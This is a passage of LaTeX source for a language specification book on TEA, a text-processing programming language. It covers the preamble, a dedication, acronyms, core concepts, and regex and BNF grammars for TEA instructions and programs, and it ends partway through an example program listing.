%---[ TEMPLATE: BOOK | monograph | mini-treatise ]
%---|original-author:JWL|date:24SEPT2025|email:jwl@nuchwezi.com
%---|TITLE: TEA TAZ – Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION
%---|EDITOR:Prof. Joseph Willrich Lutalo, Oxford
%---[MANUSCRIPT-ORIGINAL-VERSION:24SEPT2025]
%---[MANUSCRIPT-LATEST-VERSION:18DEC2025]
%----------------------------------------------------------------|
%\documentclass[a4paper, 18pt]{article} % A4 paper, readable font size
\documentclass[a4paper, 18pt]{book} % A4 book-layout, readable font size

%\usepackage{parskip} % Adds vertical space between paragraphs
\setlength{\parindent}{0pt} % Removes paragraph indentation
\setlength{\parskip}{1em}   % Adds vertical space of 1em between paragraphs


%\documentclass[a4paper, 18pt]{book} % A4 paper, readable font size
\usepackage{geometry} % Adjust margins
\geometry{top=0.8in, bottom=0.8in, left=0.8in, right=0.6in} 

\usepackage[utf8]{inputenc}


% packages we'll need...

% for about author styling
\usepackage{setspace}

% allow table of contents to also list subsections
\setcounter{tocdepth}{2}

% for better appendices
\usepackage[title,titletoc]{appendix}

% for controlling page numbers
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
\fancyhead[R]{\thepage}

% throw in page-top header
\fancyhead[L]{TEA TAZ – Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION}

% for graphics
\usepackage{graphicx}
\usepackage{caption}
\usepackage{float}

%for multi-figure figures?
\usepackage{subcaption}


% for text-wrapping in verbatim environments
\usepackage{fvextra}
\RecustomVerbatimEnvironment{verbatim}{Verbatim}{breaklines, breakanywhere}

% for drawing text boxes

% for proper treatment of urls
\usepackage{hyperref}

% for tables
\usepackage{tabularx}

% for line-breaks in table cells
\usepackage{makecell}

% for diagonalsplit in table headers cell
\usepackage{diagbox}

% make table cells center vertically where we could have used p{1cm} -- we use m{1cm}
%\usepackage{array}
% alternatively, just use custom column type --- M{1cm}
%\newcolumntype{M}[1]{>{\centering\arraybackslash}m{#1}}

%\usepackage{makecell}
\renewcommand\arraystretch{1.3}

% for long tables
\usepackage{longtable}

%\usepackage{array}
%\usepackage{longtable}
%\usepackage{booktabs}
%\usepackage{multirow}

% for custom table col widths
%\usepackage{array}
%\newcolumntype{L}{>{\centering\arraybackslash}m{2cm}}
%\newcolumntype{M}{>{\centering\arraybackslash}m{5cm}}

% for json listings...
%\usepackage{listings}
%\usepackage{minted}
%\usemintedstyle{xcode}% no parser errors in listings?
%\usemintedstyle{bw} % grayscale color in listings, but shows parser errors!

% for highlighting text
\usepackage{xcolor, soul}
% then define colors we shall use:
\definecolor{myteal}{RGB}{0, 128, 128}
\definecolor{lightgray}{HTML}{CCCCCC}
\definecolor{myorange}{HTML}{FFD7B3}

% for table with alternating row bg colors 
\usepackage[table]{xcolor}
\definecolor{lightgray}{gray}{0.9}  % or use HTML/RGB if preferred


%\definecolor{highcolor}{rgb}{0,255,255} % our default hl color for background, friendly on black text foreground
\definecolor{highcolor}{rgb}{0,255,255} %a accent background color, must be friendly on black text foreground
\sethlcolor{highcolor}

%for regular expression and TEA code presentation in console-like text-boxes
\usepackage{tcolorbox}
\tcbuselibrary{listings,skins,breakable}
\usepackage{listings}

% style for general terminal-like listings
\tcbset{
  myterminalstyle/.style={
    colback=black,       % background color
    coltext=white,       % text color
    fontupper=\ttfamily, % typewriter font
    boxrule=0pt,         % no border
    arc=0pt,             % square corners
    outer arc=0pt,
    left=2mm, right=2mm, top=1mm, bottom=1mm,
    enhanced,
    sharp corners,
  }
}

% define listings config for TEA language
\lstdefinelanguage{TEA}{
  morecomment=[l]{\#},
  sensitive=true,
  alsoletter={:*!},
  %morekeywords=[1]{i:, u!:, g:, l:, f:, x:, j:, q!:},
  morekeywords=[1]{%
a:, a.:, a*:, a!:, a.*:, a.!:, a*!:, b:, b.:, b*:, b!:, b.*:, b.!:, b*!:, c:, c.:, c*:, c!:, c.*:, c.!:, c*!:, d:, d.:, d*:, d!:, d.*:, d.!:, d*!:, e:, e.:, e*:, e!:, e.*:, e.!:, e*!:, f:, f.:, f*:, f!:, f.*:, f.!:, f*!:, g:, g.:, g*:, g!:, g.*:, g.!:, g*!:, h:, h.:, h*:, h!:, h.*:, h.!:, h*!:, i:, i.:, i*:, i!:, i.*:, i.!:, i*!:, j:, j.:, j*:, j!:, j.*:, j.!:, j*!:, k:, k.:, k*:, k!:, k.*:, k.!:, k*!:, l:, l.:, l*:, l!:, l.*:, l.!:, l*!:, m:, m.:, m*:, m!:, m.*:, m.!:, m*!:, n:, n.:, n*:, n!:, n.*:, n.!:, n*!:, o:, o.:, o*:, o!:, o.*:, o.!:, o*!:, p:, p.:, p*:, p!:, p.*:, p.!:, p*!:, q:, q.:, q*:, q!:, q.*:, q.!:, q*!:, r:, r.:, r*:, r!:, r.*:, r.!:, r*!:, s:, s.:, s*:, s!:, s.*:, s.!:, s*!:, t:, t.:, t*:, t!:, t.*:, t.!:, t*!:, u:, u.:, u*:, u!:, u.*:, u.!:, u*!:, v:, v.:, v*:, v!:, v.*:, v.!:, v*!:, w:, w.:, w*:, w!:, w.*:, w.!:, w*!:, x:, x.:, x*:, x!:, x.*:, x.!:, x*!:, y:, y.:, y*:, y!:, y.*:, y.!:, y*!:, z:, z.:, z*:, z!:, z.*:, z.!:, z*!:,%
A:, A.:, A*:, A!:, A.*:, A.!:, A*!:, B:, B.:, B*:, B!:, B.*:, B.!:, B*!:, C:, C.:, C*:, C!:, C.*:, C.!:, C*!:, D:, D.:, D*:, D!:, D.*:, D.!:, D*!:, E:, E.:, E*:, E!:, E.*:, E.!:, E*!:, F:, F.:, F*:, F!:, F.*:, F.!:, F*!:, G:, G.:, G*:, G!:, G.*:, G.!:, G*!:, H:, H.:, H*:, H!:, H.*:, H.!:, H*!:, I:, I.:, I*:, I!:, I.*:, I.!:, I*!:, J:, J.:, J*:, J!:, J.*:, J.!:, J*!:, K:, K.:, K*:, K!:, K.*:, K.!:, K*!:, L:, L.:, L*:, L!:, L.*:, L.!:, L*!:, M:, M.:, M*:, M!:, M.*:, M.!:, M*!:, N:, N.:, N*:, N!:, N.*:, N.!:, N*!:, O:, O.:, O*:, O!:, O.*:, O.!:, O*!:, P:, P.:, P*:, P!:, P.*:, P.!:, P*!:, Q:, Q.:, Q*:, Q!:, Q.*:, Q.!:, Q*!:, R:, R.:, R*:, R!:, R.*:, R.!:, R*!:, S:, S.:, S*:, S!:, S.*:, S.!:, S*!:, T:, T.:, T*:, T!:, T.*:, T.!:, T*!:, U:, U.:, U*:, U!:, U.*:, U.!:, U*!:, V:, V.:, V*:, V!:, V.*:, V.!:, V*!:, W:, W.:, W*:, W!:, W.*:, W.!:, W*!:, X:, X.:, X*:, X!:, X.*:, X.!:, X*!:, Y:, Y.:, Y*:, Y!:, Y.*:, Y.!:, Y*!:, Z:, Z.:, Z*:, Z!:, Z.*:, Z.!:, Z*!:%
},
  keywordstyle=[1]\color{green},
  commentstyle=\color{lightgray},
  morestring=[b]",
stringstyle=\color{myorange},
moredelim=[s][\color{myorange}]{\{}{\}},
}


% define custom terminal for TEA language snippets

\tcbset{
  teaterminalstyle/.style={
    enhanced,
    colback=myteal,
    coltext=white,
    fontupper=\ttfamily,
    boxrule=0pt,
    arc=0pt,
    outer arc=0pt,
    left=2mm, right=2mm, top=1mm, bottom=1mm,
    sharp corners,
    listing only,
    listing options={
      language=TEA,
     basicstyle=\ttfamily,
%keywordstyle=\color{cyan}\bfseries,
%commentstyle=\color{green}\itshape,
%stringstyle=\color{yellow}
    }
  }
}


% from google-gemini for verbatim listings:
\tcbuselibrary{listings,breakable}

% Define a language with no syntax highlighting
\lstdefinelanguage{none}{}

% Define a new tcblisting environment for verbatim content
\newtcblisting{tcbverbatim}[1][]{
  % Pass any user options to the new environment
  #1,
  breakable, % Allow long lines to wrap
  listing only, % The box contains only a listing
  listing options={
    language=none, % The 'none' language disables highlighting
    basicstyle=\ttfamily, % Use the typewriter font
    columns=flexible, % Allow flexible column widths for wrapping
    breaklines=true, % Enable line breaking
  },
}


% for maths
\usepackage{amsmath}
% for number sets symbols
\usepackage{amssymb}
%\usepackage{ntheorem}
\usepackage{amsthm}

\usepackage{tikz} % for v-aligned matrices with arrows between them
\usetikzlibrary{matrix, positioning} % ← This line is essential


% extra symbols
\usepackage{textgreek}
%\usepackage{mnsymbol}

% for writing our theorems and defs...
\newtheorem{comp}{Computation}
\newtheorem{theo}{Theorem}
\newtheorem{defn}{Definition}
\newtheorem{lem}{Lemma}
\newtheorem{prop}{Proposition}
\newtheorem{axiom}{Axiom}
\newtheorem{post}{Postulate}
\newtheorem{trans}{Transformation}
\newtheorem{transf}{Transformer}
\newtheorem{law}{Law}
\newtheorem{prob}{Problem}
\newtheorem{soln}{Solution}
\newtheorem{alg}{Algorithm}




% for wrapping text around floats
\usepackage{wrapfig}

% to include pdf pages
\usepackage{pdfpages}

% for multiline comments...
%\newcommand{\comment}[1]{}

% for the cardinality symbol
\newcommand{\invpi}{\rotatebox[origin=c]{180}{$\pi$}}

\title{\textbf{TEA TAZ} – \textbf{T}ransforming \textbf{E}xecutable \textbf{A}lphabet A: to Z: COMMAND SPACE SPECIFICATION}


\author{Willrich J. Lutalo\thanks{Inventor of the TEA language, also currently a volunteering \& Independent Principal Investigator at Nuchwezi Research --- \url{https://nuchwezi.com}}\\
\texttt{joewillrich@gmail.com, jwl@nuchwezi.com}}

\date{\today}


\begin{document}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% BEGIN DOCUMENT: BOOK FONT SIZE SETTING: Large
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\Large


%---[ START BOOK CONTENT/FRONT ]
\frontmatter

% insert [front] cover --- could just be a PNG or PDF
\includepdf[pages=1]{../taz_front_cover.pdf}


% insert I*POW frontmatter
\includepdf[pages=-]{resources/pdfs/FrontisMatter.pdf}



\maketitle

\chapter*{Dedication}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.8\textwidth}}
I:\{\textbf{Dedicate this book to Dr. Marriette of Makerere University, CoCIS graduate school.} When she first taught me LISP on the white-board, during my masters class on advanced computer programming --- \textbf{MCN7105}:``Structure and Interpretation of Computer Programs", I felt like a special mini-universe of computing had been hidden from me all along. \textit{Exposure to not just a different, albeit uncommon syntax and abstraction approach to computational problem solving she passed down to me, and somewhat helped spur my interest further, into exploring non-mainstream programming languages. Also, I recall when I first encountered a serious non-C-family language, RUBY by Matz, first exposed to me by Revence Kalibwani (R*I*P) --- also a seasoned Haskell programmer, I never looked back, and now I have a truly elegant, fully functional non-C-family computer programming language of my own, several years down the road.}\}
\begin{verbatim}
|U:|A:|V:C|A*:C 
\end{verbatim}
\\
	\hline
	              
\end{tabular}
  \label{TABDEDC}
\end{table}

\tableofcontents

\listoffigures

\listoftables

\newpage

\Large



% Title for the section
\chapter*{List of ACRONYMS}
\addcontentsline{toc}{chapter}{List of Abbreviations}
\label{CHAPACRONYMNS}

% Longtable for abbreviation list
\begin{longtable}{p{3cm} p{12cm}}
\textbf{ABBR.} & \textbf{Definition} \\
\hline
\endfirsthead

\textbf{ABBR.} & \textbf{Definition} \\
\hline
\endhead

% Add your abbreviations below

\textbf{BASH} & Bourne Again Shell \\

\textbf{BNF} & Backus–Naur Form \\

\textbf{CGF} & Context-Free Grammar\\

\textbf{IDE} & Integrated Development Environment\\

\textbf{I*POW} & International Portfolio of Writers \\

\textbf{JSON} & JavaScript Object Notation \\

\textbf{MSS} & Model Sequence Statistic \\

\textbf{\textit{o}-SSI} & \textit{orthogonal}-Symbol Set Identity \\

\textbf{RNG} & Random Number Generator  \\

\textbf{RSG} & Random Sequence Generator  \\

\textbf{TC} & TEA Command \\

\textbf{TCD} & TEA Command Delimiter\\
 
\textbf{TCOM} & TEA Comment\\
 
\textbf{TCQ} & TEA Command Qualifier\\
 
\textbf{TEA} & Transforming Executable Alphabet\\
 
\textbf{TI} & TEA Instruction\\
 
\textbf{TID} & TEA Instruction Delimiter\\
 
\textbf{TIL} & TEA Instruction Line\\

\textbf{TIPE} & TEA Instruction Parameter Expression\\

\textbf{TIPED} & TEA Instruction Parameter Expression Delimiter\\

\textbf{TOE} & TEA Opaque Expression\\

\textbf{TPC} & TEA Primitive Command\\

\textbf{WSL} & Windows Subsystem for Linux\\




\end{longtable}




%---[ BEGIN BOOK CONTENT/CHAPTERS ]

\mainmatter

%\begin{abstract}
\chapter*{Abstract}

{
\Large

This manuscript builds upon the earlier TEA (\textbf{T}ransforming \textbf{E}xecutable \textbf{A}lphabet) general-purpose, text-processing oriented and sequence-transformer paradigm computer programming language formalization and specification work in J. Willrich Lutalo's PhD research diary \cite{lutalo2024tea}. For all practical purposes, this document is best treated as \textbf{a living document}; it is continually being enhanced as TEA evolves, but must also be considered the official, authoritative formal reference on matters concerning the definition, grammar, syntax and semantics, as well as analysis, processing and application of TEA programs and general programming. 
     \newline\newline
     \textbf{Keywords}: Software Engineering, Software Language Engineering, Language Definition, Instruction Set, Developer Manual, Software Debugging, TEA Programming, Computational Modeling, Text Processing, Executable Letters, Transforming Executable Alphabet.
%\end{abstract}
}

\newpage

\chapter{Introduction}
\label{SEC1}

Computers are abstractions that help humans solve problems via other abstractions known as software programs, which are implemented using other abstractions known as software languages. The Transforming Executable Alphabet (TEA) language, is a general-purpose computer programming language that is text-processing oriented, is currently implemented as an interpreted language for both the WEB (internet) and SYSTEM (as standalone or embeddable)\footnote{Though we shall cover more about this in a later section of the TAZ, note that the TEA language currently comes in two flavours --- two, because, even though the entire TEA instruction set A: to Z: is almost standard and works the same irrespective of platform where a TEA program is run, and yet, in practice, and particularly for programs using the \textbf{Z:} command space, there are unavoidable differences in the powers and capabilities one can access and or leverage from the external environment via the \textbf{ZAP} facility --- \texttt{z:CMD}, \texttt{z*:vCMD} and related \textit{external system command execution} variants of that TEA instruction that one might wish to use. In particular, the \textbf{WEB TEA}/TEA running in a web-browser programs can use external powers via JavaScript, but yet, commandline versions can mostly use the system/shell interface of the host system only. More about this when we come to \textbf{Z:} later.}. And in this manual, we shall understand its origins, purpose, design, implementation, applications [and applicability] as well as get glimpses of what its future is likely to be.

\section{Essential Nomenclature and Concepts}
\label{SECNOMEN}

For the rest of this document, the following definitions and clarifications are important:\\

\begin{enumerate}
\item{ \textbf{TEXT:} In the TEA computer programming language, Text is considered to be any form of data a TEA program can process and reason about. \textbf{All TEA programs process only Text.}}
\item{ 
\textbf{STRINGS:} Let us assume a finite sequence of distinct characters from a finite set such as Unicode-8 or ASCII. This is the alphabet understood and processed by TEA programs. Let us call any such finite sequence, for example {a,b,c,d, ,f} the string “abcd f”, and for TEA programs, we shall typically write an explicit string---such as “a b c”, as an expression expressing the exact character and position---thus order, it occupies in the string, by either the common syntax “a b c” (such as some programming languages do… Java, Python and C), but for TEA, we shall also allow, in-fact, recommend that we express all strings in a program source-code using the earlier syntax; {abc f}. For TEA programs, all data is presented as Text, and at the source-code or even run-time level, data being processed by a TEA program is expected to be, and is treated as a string.
}
\item{
\textbf{REGULAR EXPRESSIONS:} Because TEA is a Text Processing language at core, it means, advanced text processing power and capabilities need be built within the language by design. Among these is the ability to automatically discover patterns in strings and then do things based on or to them. A kind of intelligent or controllable and directable processing. For pattern matching and pattern-based conditional processing, TEA programs employ the concept and mechanics of Regular Expressions. For clarification purposes while reading this TEA specification as well as future literature and TEA source code built based on this standard, TEA regular expressions are to be written in a TEA program without any explicit delimiters except the standard TEA Parameter Expression Delimiter (refer to Figure 1) “:” ---to defer from strings. Thus, where it is expected to write an explicit regular expression (also typically referred to as a REGEX in this specification) such as \texttt{\^{}\$} to denote the REGEX used to match the empty string, typically expressed as “”, shall likewise be written as \texttt{\^{}\$} when being expressed within a TEA program source code --- particularly so, in parts of TEA instructions where the instruction signature dictates that the argument or parameter is expected to be a literal regular expression. However, the same, when being expressed or being passed around in a TEA program, shall instead be written as \texttt{\{\^{}\$\}} or perhaps ``\texttt{\^{}\$}". Of course, it would have been possible to actually write both explicit strings and regular expressions using the same simple and bare syntax---for example, with the discarding of the string delimiting characters “ and ” for the typical, and \{ and \} for TEA, but sometimes it is safer to sacrifice mathematical elegance while writing a program, and instead secure useful program source-code properties such as readability, program comphrensibility and lexical correctness – for both the human writing the code – such as we expect most TEA programs shall be, and the machines meant to read, parse and process things based on human-written TEA program source code.
}
\item{
\textbf{AI:} Active Input --- This refers to the main input or data to be referred to or processed by the current TEA Program instruction at the time it is being evaluated.
IO: Instruction Output --- This refers to the main output or data to be returned by the current TEA Program instruction after it is fully executed.
}
\item{
\textbf{WORD:} This refers to a sequence of non-whitespace characters.
}
\item{
\textbf{TEA PRIMITIVE:} Also the same as “TEA Primitive Command” or “TEA Canonical Command”, is any one of the letters in the Latin Alphabet, a to z or A to Z, followed by a single colon “:” character, and the letter used determines what purpose a TEA instruction has in a program. Also, each primitive has unique semantics as defined in the TEA Command Space specification. It is important to note that in TEA, much as the standard style is to use lowercase letters for TEA primitives such as “a:” or “m:”, yet, case doesn’t matter, and “a:” and “A:” are basically equivalent, but “a:” and “A!:” aren’t, much as they reference the same basic TEA primitive “a”. In a TEA primitive such as “a:”, we may refer to the command letter “a” as the “Command Character”.
}
\item{

\textbf{TEA INVERSE:} When any of the TEA primitives such as “a:” has the command character followed by a TEA Command Qualifier such as the exclamation mark “!” or star-character “*”, such as with “a!:” or “g*:”, it is then considered to be the inverse or alternate form of the implied primitive. So, “a!:” is the alternate form of the command “a:”, and unless where specified, typically the canonical form of a TEA primitive, such as “a:” has different effects and purpose from its inverse form “a!:”
}
\item{
\textbf{INERT or UNDEFINED TEA COMMAND:} When a TEA Command is flagged as or defined as “INERT” or “UNDEFINED” or “RESERVED”, it means that command or its implied form has no effect in a standard TEA program, and can be ignored by the TEA processor when the program is being executed. Typically, this occurs with the special treatment of Inverse forms of a TEA primitive, such as when “a:” is defined, but “a!:” is not or when “a:” is, but “a:WITH PARAMETERS” isn’t. Also, sometimes a command might have one of its parameterized forms (but not all of them) undefined or INERT. For example:
\begin{itemize}
\item \texttt{V:}
\item \texttt{V:VAULT\_NAME}
\item \texttt{V:VAULT\_NAME:VAULT\_VALUE}
\end{itemize}

are all defined, but \texttt{V:VAULT\_NAME:VAULT\_VALUE:OTHER\_ARGUMENT} isn't. Typically, where for example a primitive such as “a:” is defined but its parameterized form isn’t, it could be safe to assume that “a:WITH PARAMETERS” shall simply be ignored and not have effect in the program, much as “a:” is defined and would cause an effect in the program. In an advanced TEA program environment, using or writing an INERT form of a TEA command should either be flagged or reported as an error. Otherwise, typically, the safe judgment to make concerning INERT commands is that they shouldn’t and won’t modify or affect the AI, and thus, should transparently return the AI as IO, and thus can be considered to be non-existent in a TEA program.
}
\end{enumerate}


\subsection{TEA Command Variations and Qualifying TEA Commands Correctly}

So, based on the grammar rules by which we can form valid TEA Instructions (see \textbf{\autoref{FIG1}}), we know that, in total, we can have \textbf{208 possible TEA Commands}. We arrive at that number as such:

\begin{enumerate}
\item Each TC consists of a single element from $\psi_{az}$ --- so that's $26 \times 2$ --- since we allow both upper case and lower case letters $\rightarrow 52$.
\item{Each TC can be qualified, and thus, can be terminated/suffixed with one of the following TCQ options:

\begin{enumerate}
\item \texttt{} --- essentially, no TCQ (plain): so that, if TC is ``A", we get ``A:", if ``B", then ``B:", etc.
\item \texttt{.} --- essentially, if TC is ``A", we get ``A.:", if ``B", then ``B.:" etc.
\item \texttt{*}
\item \texttt{!}
\item \texttt{.*}
\item \texttt{.!}
\item \texttt{*!} --- essentially, if TC is ``A", we get ``A*!:", if ``B", then ``B*!:" etc.
\end{enumerate}

Which gives us \textbf{7 TCQ variants}, and thus a total of $52 \times 7 \rightarrow 364$ TEA Command Variations.
}
\end{enumerate}

Thus, without delving directly here into what each of those TEA Commands does, which ones are INERT and which are not, what \textbf{instruction signatures} each supports or allows\footnote{Some TC might accept just one parameter or argument, while others might allow two or more --- delimited by ``:".} etc --- stuff we are going to cover well once we dive into the breakdown of each TEA primitive command's specification and semantics (which is exactly what the TEA TAZ is about), we at least know, we have a total of 364 possible distinct TEA commands to explore! That alone, definitely justifies the need for this manual, and an insight into the details of each of the 26 TP, a: to z:\footnote{Of course, not to loose hope for those who wish to memorize the entire TEA instruction set or the TAZ --- especially because, unlike many other programming languages out there, for TEA, which has a fixed library/instruction set, it's possible, and we know that, since a: and A: are equivalent, or that any TC with some particular primitive say, K:, is equivalent to the variant with the same primitive just in a different case, thus, instead of a total of 364 commands, TEA essentially supports $26 \times 7 \rightarrow 182$ distinct commands.}



\chapter{THE TEA LANGUAGE DEFINITION}
\label{SEC2}

The Transforming Executable Alphabet (TEA) language, is a formal, regular, computable and Turing Complete programming language specified formally by the grammars we shall see in this section. As with regular, formal languages, we can then use TEA to express formal statements or expressions in its language and using its formal syntax and semantics, that could be either individual instructions that do just one thing, or entire collections of them arranged and structured coherently, that specify how a particular or general kinds of tasks might be solved --- these are typically, or more technically known as automatons, or rather, computer programs, capable of running on any Turing Machine or Abstract Machine capable of interpreting or processing the TEA formal language in this case.


\section{TEA Lexical and Syntax Grammars}
\label{SECGRAM}

First, we shall consider the lexical structure of TEA programs.

Essentially, all TEA programs, in their simplest, unminified form\footnote{That is, without 
``\texttt{|}" delimiters between individual TEA instructions  instead of the NEW LINE \texttt{\textbackslash n} character.} consist of one or more TEA Instructions, and where each TEA Instruction Line (TIL) conforms to the following simplified \textbf{lexical specification} specified using the formal language of \textbf{Regular Expressions}:



\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (Regular Expression)]
  \begin{lstlisting}
^\s*[a-zA-Z](?:[\.!\*]|(?:\*!)|(?:\*\.)|(?:!\.)|(?:\*!\.))?:.*$
  \end{lstlisting}
  \end{tcolorbox}
  \caption{The TEA Instruction Lexical Specification (regular language)}
  \label{FIG1}
\end{figure}

    

And then, with simplification, all TEA Programs (containing one or more TILs, and potentially minified), conform to the following syntax specification\footnote{Also referred to as ``Lexical Grammar" in some contexts.} expressed using regular expressions to:


    
    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (Regular Expression)]
  \begin{lstlisting}
([a-zA-Z]\*?!?\.?:.*(:.*)*\|?)+(#.*)*
  \end{lstlisting}
  \end{tcolorbox}
  \caption{The TEA Program Lexical Specification (regular language)}
  \label{FIG2}
\end{figure}


Essentially, in \textbf{\autoref{FIG1}}, we see the final, most generic lexical specification of any legitimate TEA Instruction (TI), and the implication is that a TEA program consists of one or more TI – with or without TEA comments (more about this later). We see that a TEA Instruction obeys the following lexical and baseline-syntax rules:

\begin{enumerate}
\item \textbf{The instruction starts with a single letter from Latin alphabet} --- $\psi_{az} = \langle a, b, c, ..., y, z \rangle$, and that the case of the letter doesn't matter. This letter is what is called a \textbf{TEA Primitive Command} (TPC).
\item \textbf{After the TPC, we might optionally have} a dot (.), an exclamation mark (!), an asterisk (*) or an ordered pairwise combination of them; (.!) or (.*) or (*!) but not (.*!). These are refered to as \textbf{TEA Command Qualifiers} (TCQ), and nothing else after the TPC and TCQ except the full colon (:)---a \textbf{TEA Command Delimiter} (TCD). When the TPC is followed by TCQ we then call that command the \textbf{Inverse} or \textbf{Alternate} form of the TPC.
\item After the TCD, everything that follows until the end of the line or until the vertical bar character (\verb!|!)---the \textit{TI Delimiter} (TID)\footnote{Concerning the TID, earlier ideas had included the possibility of delimiting multiple TI expressions, possibly on the same line, using either the (;) or (,) characters.} is a \textbf{TI Parameter Expression} (TIPE).
\item TIPE consists of one or more characters excluding the \textbf{TIPE Delimiter} (TIPED) symbol--- also called ``\textbf{TEA Parameter Expression Delimiter}", which is the full colon, ``:", just like the TCD, followed by one or more TIPE.
\item After the TID, and on the same line, everything that follows is either another TI or is something essentially treated as either whitespace or a comment---thus a \textbf{TEA Opaque Expression} (TOE).
\item Taken together, the TCP$\cdot$TCQ$\cdot$TCD specify a \textbf{TEA Command} (TC), and TC$\cdot$TIPE specifies a complete \textbf{TEA Instruction Line} (TIL)
\item When a line in a TEA program doesn't start with a valid TC with or without leading white space, such a line is treated as or interpreted as TOE.
\item All TOE in a TEA program are essentially \textbf{TEA Comments} (TCOM), and aren't processed by the TEA interpreter\footnote{And thus, can be safely eliminated when a TEA program is either sanitized or minified.}.
\end{enumerate}

In summary, a TIL, and thus a TI, can be produced thus:

    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (Simple Grammar)]
  \begin{verbatim}
	    TIL := WS*•TI•TI*•TOE•EOL
	    WS := White Space
	    TI := WS*•TC•TIPE•TID
	    TC := TCP•TCQ•TCD
	    TCP := [a-zA-Z]
	    TCQ := . | ! | * | *!  
	    TCD := :
	    TIPE := NTIPED•(TIPED•NTIPED*)*
	    TIPED := :
	    NTIPED := [^:]*
	    TID := |
	    TOE := NEOL* | TCOM
	    NEOL := [^\n]*
	    TCOM := #NEOL
	    EOL := NLC | NLC•CR
	    NLC := New Line Character
	    CR := Carriage Return
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Instruction Context Free Grammar in Simple Form (context-free language)}
  \label{FIG3}
\end{figure}


For purists especially, the same can be rewritten in true/traditional Backus–Naur Form (BNF) as follows:


    \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Instruction Line (BNF Grammar)]
  \begin{verbatim}
		<TIL> ::= <WS_List> <TI> <TI_List> <TOE> <EOL>
		
		<WS_List> ::= <WS> <WS_List> | ε
		<TI_List> ::= <TI> <TI_List> | ε
		
		<WS> ::= "White Space"
		
		<TI> ::= <WS_List> <TC> <TIPE> <TID>
		
		<TC> ::= <TCP> <TCQ> <TCD>
		<TCP> ::= "a" | "b" | ... | "z" | "A" | "B" | ... | "Z"
		<TCQ> ::= "." | "!" | "*" | "*!"
		<TCD> ::= ":"
		
		<TIPE> ::= <NTIPED> <TIPE_Tail>
		<TIPE_Tail> ::= <TIPED> <NTIPED_List> | ε
		<NTIPED_List> ::= <NTIPED> <NTIPED_List> | ε
		
		<NTIPED> ::= any character except ":"
		
		<TIPED> ::= ":"
		
		<TID> ::= "|"
		
		<TOE> ::= <NEOL_List> | <TCOM>
		<NEOL_List> ::= <NEOL> <NEOL_List> | ε
		<NEOL> ::= any character except newline
		
		<TCOM> ::= "#" <NEOL>
		
		<EOL> ::= <NLC> | <NLC> <CR>
		<NLC> ::= "New Line Character"
		<CR> ::= "Carriage Return"
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TIL CFG in BNF}
  \label{FIG4}
\end{figure}


Where TIL is a \textbf{TEA Instruction Line}, and thus a \textbf{TEA Program} (TP) can be fully produced thus:


   \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (Simple Grammar)]
  \begin{verbatim}
	    TP := TIL • (TOL* • TIL*)*
	    TOL := TOE • EOL | TCOML
	    TCOML := WS* • TCOM • EOL
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Program Context Free Grammar in Simple Form}
  \label{FIG5}
\end{figure}

In traditional BNF, we have:


   \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Program (BNF Grammar)]
  \begin{verbatim}
		<TP> ::= <TIL> <TP_Tail>
		<TP_Tail> ::= <TOL_List> <TIL_List> <TP_Tail> | ε
		
		<TOL_List> ::= <TOL> <TOL_List> | ε
		<TIL_List> ::= <TIL> <TIL_List> | ε
		
		<TOL> ::= <TOE> <EOL> | <TCOML>
		
		<TCOML> ::= <WS_List> <TCOM> <EOL>
		<WS_List> ::= <WS> <WS_List> | ε
  \end{verbatim}
  \end{tcolorbox}
  \caption{The TEA Program CFG in BNF (context-free language)}
  \label{FIG6}
\end{figure}


Where TOL is a \textbf{TEA Opaque Line}---essentially a line in a TEA program that can be entirely ignored by the TEA parser, processor or interpreter because it either consists of only TOE (TEA Opaque Expression) or TCOM (and thus is a TCOML). Thus do we now have a full, and complete specification of the TEA programming language syntax. This should help with lexing TEA program source code\footnote{Those not computer scientists, lexing is how we can automatically break apart a given TEA program source-code into meaningful bits or tokens, and thus be able to verify or validate the program against the language specification or formal grammar, even without having to execute or run the program. It is very vital in situations such as Static Program Analysis and Verification, but also in Code Beautification or Syntax Highlighting as part of a TEA Code Pretty Printer --- typical aspects of a mature programming language's formal language support tools.}, and thus parsing TEA Programs\footnote{Those interested, traditional parsers typically operated on some form of CFG of a language after it has been lexxed, such as when the grammar is expressed as a token tree or such. However, those are mostly implementation-specific details, and also dependent on whether the language is compiled or interpreted. TEA is currently manifested as an interpreted language, and those interested in studying the TEA parser, can visit the reference implementation on GitHub\cite{cli_tttt} to explore.}. However, as for the semantics of any given TEA program, it is important to combine knowledge of valid TEA program syntax, as well as the valid syntax and semantics of each individual TEA primitive command space. This is specified in the TEA A: to Z: Command Space Specification section of the TAZ.

\section{Quirks of the TEA Parser: Parsing and Processing Multi-line TI and Multiple TI On A Single Line}
\label{SECPARSE}

The minimal TEA language grammar defined in the previous section might not readily capture or express one small quirk about how TEA programs might be written in practice – such as when TI spans more than one line --– an example being when a string parameter being passed to an instruction in the source code has to span multiple lines, or when a TEA comment needs do the same. The other quirky case is when multiple TI need be expressed on a single line –-- something which might not be immediately obvious by merely looking at the TEA language grammar.


An example TEA program that highlights these syntactic quirks follows…

  \begin{figure}[H]
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program]
  \begin{lstlisting}[language=TEA, caption={TP 1}, label={LST1}, numbers=left]
i: {This is a multi-line
string} | v:vIN # followed by comment
u!: | g:
l:E | x:{1-}
f:^1-i:A:B | l:A | x!:-1 | j:C | l:B | i!:"T" | j:E
l:C | q!:
